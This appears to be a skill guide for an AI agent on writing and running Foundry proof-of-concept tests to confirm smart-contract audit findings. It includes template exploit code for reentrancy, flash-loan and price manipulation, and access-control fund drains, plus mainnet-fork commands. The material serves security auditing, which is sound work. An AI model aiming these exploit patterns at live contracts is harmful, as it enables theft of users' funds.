---
name: PoC Testing
description: >
  This skill should be used when the user asks to "write a PoC", "create exploit test",
  "run forge test", "validate vulnerability", "test exploit", "foundry test",
  or when an auditor needs to create and execute Proof of Concept code to validate findings.
version: 1.0.0
---

# PoC Testing with Foundry

Guide for creating and executing Proof of Concept (PoC) exploit tests using Foundry.

## Overview

PoC tests validate discovered vulnerabilities by demonstrating actual exploitation.
Use Foundry's testing framework to write, run, and verify exploit code.

## Quick Start

### Run a PoC Test

```bash
# Run specific test with verbose output
forge test --match-test test_Exploit_Name -vvv

# Run all PoC tests
forge test --match-path test/poc/*.t.sol -vvv

# Run with gas reporting
forge test --match-test test_Exploit -vvv --gas-report
```

### Basic PoC Structure

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract PoCTest is Test {
    VulnerableContract target;
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy target contract
        target = new VulnerableContract();

        // Fund contracts
        vm.deal(address(target), 100 ether);
        vm.deal(attacker, 1 ether);
    }

    function test_Exploit_Description() public {
        // Record initial state
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = attacker.balance;

        // Execute exploit
        vm.startPrank(attacker);
        // ... exploit code ...
        vm.stopPrank();

        // Verify exploit success
        assertGt(attacker.balance, attackerBalanceBefore, "Attacker should profit");
        assertLt(address(target).balance, targetBalanceBefore, "Target should lose funds");
    }
}
```

## Essential Cheatcodes

| Cheatcode | Purpose | Example |
|-----------|---------|---------|
| `vm.deal(addr, amt)` | Set ETH balance | `vm.deal(attacker, 10 ether)` |
| `vm.prank(addr)` | Next call from addr | `vm.prank(attacker)` |
| `vm.startPrank(addr)` | All calls from addr | `vm.startPrank(attacker)` |
| `vm.stopPrank()` | End prank | `vm.stopPrank()` |
| `vm.warp(timestamp)` | Set block.timestamp | `vm.warp(block.timestamp + 1 days)` |
| `vm.roll(blockNum)` | Set block.number | `vm.roll(block.number + 100)` |
| `vm.expectRevert()` | Expect next call reverts | `vm.expectRevert("Insufficient")` |
| `deal(token, addr, amt)` | Set ERC20 balance | `deal(address(usdc), attacker, 1e6)` |

## PoC Patterns by Vulnerability Type

### Reentrancy PoC

```solidity
contract ReentrancyAttacker {
    VulnerableVault target;
    uint256 attackCount;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attackCount < 5 && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw(1 ether);
        }
    }
}

function test_Exploit_Reentrancy() public {
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(target));
    vm.deal(address(attacker), 1 ether);

    uint256 targetBefore = address(target).balance;
    attacker.attack{value: 1 ether}();

    assertLt(address(target).balance, targetBefore - 1 ether, "Should drain more than deposited");
}
```

### Flash Loan PoC

```solidity
function test_Exploit_FlashLoan() public {
    // Get flash loan
    uint256 loanAmount = 1000000 ether;
    flashLender.flashLoan(address(this), loanAmount);
}

function onFlashLoan(uint256 amount) external {
    // Manipulate price
    targetPool.swap(amount, 0, address(this), "");

    // Exploit manipulated price
    vulnerableProtocol.liquidate(victim);

    // Repay flash loan
    IERC20(token).transfer(msg.sender, amount);
}
```

### Access Control PoC

```solidity
function test_Exploit_AccessControl() public {
    // Try to call admin function as non-admin
    vm.prank(attacker);

    // This should succeed if vulnerable
    target.adminWithdraw(address(target).balance);

    assertEq(address(target).balance, 0, "Attacker drained funds");
}
```

### Price Manipulation PoC

```solidity
function test_Exploit_PriceManipulation() public {
    // Step 1: Large swap to manipulate spot price
    vm.startPrank(attacker);
    pool.swap(1000000 ether, 0, attacker, "");

    // Step 2: Exploit inflated price
    uint256 shares = vulnerableVault.deposit{value: 1 ether}();

    // Step 3: Reverse swap
    pool.swap(0, 1000000 ether, attacker, "");

    // Step 4: Withdraw at normal price
    uint256 withdrawn = vulnerableVault.withdraw(shares);
    vm.stopPrank();

    assertGt(withdrawn, 1 ether, "Should profit from manipulation");
}
```

## Running PoC Tests

### Basic Execution

```bash
# Single test with traces
forge test --match-test test_Exploit_Reentrancy -vvvv

# All tests in file
forge test --match-path test/PoC.t.sol -vvv

# With fork from mainnet
forge test --fork-url $ETH_RPC_URL --match-test test_Exploit -vvv
```

### Verbosity Levels

| Flag | Output |
|------|--------|
| `-v` | Basic test results |
| `-vv` | Logs and events |
| `-vvv` | Stack traces for failures |
| `-vvvv` | Stack traces + setup traces |
| `-vvvvv` | All traces including successful |

### Fork Testing

```bash
# Fork mainnet at specific block
forge test --fork-url $ETH_RPC_URL --fork-block-number 18000000 -vvv

# With Anvil local fork
anvil --fork-url $ETH_RPC_URL &
forge test --rpc-url http://localhost:8545 -vvv
```

## Best Practices

1. **Clear Setup**: Document initial state and assumptions
2. **Precise Assertions**: Use specific assertions with messages
3. **Measure Impact**: Quantify funds stolen/affected
4. **Minimal Code**: Keep PoC simple and focused
5. **Realistic Conditions**: Use mainnet fork when possible
6. **Document Steps**: Comment each exploitation step

## Reporting Results

After running PoC, include in finding:

```markdown
## Proof of Concept

### Test File
`test/poc/H01_Reentrancy.t.sol`

### Execution
\`\`\`bash
forge test --match-test test_Exploit_Reentrancy -vvv
\`\`\`

### Results
- Initial attacker balance: 1 ETH
- Final attacker balance: 51 ETH
- Funds drained: 50 ETH
- Test status: PASS ✓
```

## Additional Resources

For detailed patterns and advanced techniques:
- `references/foundry-cheatcodes.md` - Complete cheatcode reference
- `examples/` - Working PoC examples by vulnerability type
